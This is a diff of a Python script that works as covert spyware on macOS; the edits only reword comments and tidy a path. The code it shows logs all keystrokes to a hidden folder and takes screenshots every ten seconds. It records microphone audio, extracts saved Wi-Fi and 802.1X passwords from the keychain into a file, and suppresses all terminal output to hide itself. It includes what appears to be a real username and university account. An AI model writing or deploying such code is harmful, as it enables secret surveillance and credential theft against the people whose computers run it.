@@ -9,31 +9,31 @@ import sys
 from pynput import keyboard  # type: ignore
 from PIL import ImageGrab
 
-# Create log directory if it doesn't exist
+# Create the directory to store logs if it doesn't already exist
 log_dir = "/Users/mannatvirk/.hiddenfolder"
 os.makedirs(log_dir, exist_ok=True)
 
-# Configure logger for keystrokes (keylog.txt)
+# Set up logging for keystrokes (keylog.txt)
 keystroke_logger = logging.getLogger('keystroke_logger')
 keystroke_logger.setLevel(logging.INFO)
 keystroke_handler = logging.FileHandler(os.path.join(log_dir, "keylog.txt"))
 keystroke_handler.setFormatter(logging.Formatter('%(message)s'))
 keystroke_logger.addHandler(keystroke_handler)
 
-# Configure logger for operational logs (log.txt)
+# Set up logging for general operations (log.txt)
 operation_logger = logging.getLogger('operation_logger')
 operation_logger.setLevel(logging.INFO)
 operation_handler = logging.FileHandler(os.path.join(log_dir, "log.txt"))
 operation_handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
 operation_logger.addHandler(operation_handler)
 
-# Mapping of SSIDs to account names (for 802.1X networks)
+# SSID to account mapping for 802.1X networks
 ssid_to_account = {
     "eduroam": "z5455543@ad.unsw.edu.au",
-    # Add other SSID to account mappings here
+    # Add other mappings as needed
 }
 
-# Function to take a screenshot and log to log.txt
+# Take a screenshot and log the event
 def take_screenshot():
     try:
         timestamp = int(time.time())
@@ -42,18 +42,18 @@ def take_screenshot():
         screenshot.save(filename, format="PNG")
         operation_logger.info(f"Screenshot taken and saved to {filename}")
     except Exception as e:
-        operation_logger.info(f"An error occurred while taking a screenshot: {e}")
+        operation_logger.info(f"Error taking screenshot: {e}")
 
-# Function to capture screenshots at regular intervals (every 10 seconds)
+# Continuously take screenshots at set intervals
 def periodic_screenshots(interval=10):
     while True:
         take_screenshot()
         time.sleep(interval)
 
-# Function to log keystrokes to keylog.txt in a horizontal format
+# Log keystrokes to keylog.txt in a continuous line
 def on_press(key):
     try:
-        # Log normal keys
+        # Log standard keys
         keystroke_logger.handlers[0].stream.write(f"{key.char}")
         keystroke_logger.handlers[0].stream.flush()
     except AttributeError:
@@ -66,16 +66,17 @@ def on_press(key):
             keystroke_logger.handlers[0].stream.write(f"[{key.name}]")
         keystroke_logger.handlers[0].stream.flush()
 
-# Function to record audio and log to log.txt
+# Record audio and save to a file
 def record_audio(filename, duration, samplerate=44100, channels=1):
     try:
         recording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels)
-        sd.wait()  # Wait until recording is finished
+        sd.wait()  # Wait for the recording to complete
         sf.write(filename, recording, samplerate)
-        operation_logger.info(f"Audio recording completed and saved to {filename}")
+        operation_logger.info(f"Audio recording saved to {filename}")
     except Exception as e:
-        operation_logger.info(f"An error occurred during audio recording: {e}")
+        operation_logger.info(f"Error during audio recording: {e}")
 
+# Get the current connected Wi-Fi SSID
 def get_current_wifi_ssid():
     try:
         result = subprocess.check_output(
@@ -92,40 +93,39 @@ def get_current_wifi_ssid():
         logging.info("Failed to get current Wi-Fi network.")
         return None
 
+# Retrieve and save the Wi-Fi password for the current SSID
 def get_wifi_password(ssid):
     account = ssid_to_account.get(ssid)
     if account:
-        # For 802.1X networks
         command = f'security find-generic-password -D "802.1X Password" -a "{account}" -w'
     else:
-        # For networks using pre-shared keys
         command = f'security find-generic-password -D "AirPort network password" -s "{ssid}" -w'
+    
     try:
         result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, text=True)
         password = result.strip()
-        with open("/Users/mannatvirk/.hiddenfolder/wifi_password.txt", "w") as f:
+        with open(os.path.join(log_dir, "wifi_password.txt"), "w") as f:
             f.write(f"Password for SSID '{ssid}': {password}\n")
-        logging.info(f"Password for SSID '{ssid}' retrieved and saved.")
+        logging.info(f"Password for SSID '{ssid}' saved.")
     except subprocess.CalledProcessError as e:
-        logging.info(f"Could not retrieve password for SSID '{ssid}' or the operation was denied. Error: {e}")
+        logging.info(f"Could not retrieve password for SSID '{ssid}': {e}")
     except Exception as e:
-        logging.info(f"An unexpected error occurred: {e}")
+        logging.info(f"Unexpected error: {e}")
 
 if __name__ == "__main__":
-    # Redirect stdout and stderr to suppress terminal output
+    # Suppress terminal output for stdout and stderr
     sys.stdout = open(os.devnull, 'w')
     sys.stderr = open(os.devnull, 'w')
 
     # Start the periodic screenshot thread
-    screenshot_thread = threading.Thread(target=periodic_screenshots, args=(10,), daemon=True)  # 10-second interval
+    screenshot_thread = threading.Thread(target=periodic_screenshots, args=(10,), daemon=True)
     screenshot_thread.start()
 
-    # Define audio recording parameters and start in a daemon thread
+    # Set audio recording parameters and start recording thread
     audio_filename = os.path.join(log_dir, "audio_rec.wav")
-    recording_duration = 300  # Record for 300 seconds (5 minutes)
+    recording_duration = 300  # Record for 5 minutes
     audio_thread = threading.Thread(target=record_audio, args=(audio_filename, recording_duration), daemon=True)
     audio_thread.start()
-
 
     current_ssid = get_current_wifi_ssid()
 
@@ -134,9 +134,9 @@ if __name__ == "__main__":
     else:
         logging.info("No connected Wi-Fi network found.")
 
-    # Start the keylogger listener
+    # Start the keylogger
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
 
-    # Keep the script running by joining the listener thread only
+    # Keep the script running
     listener.join()
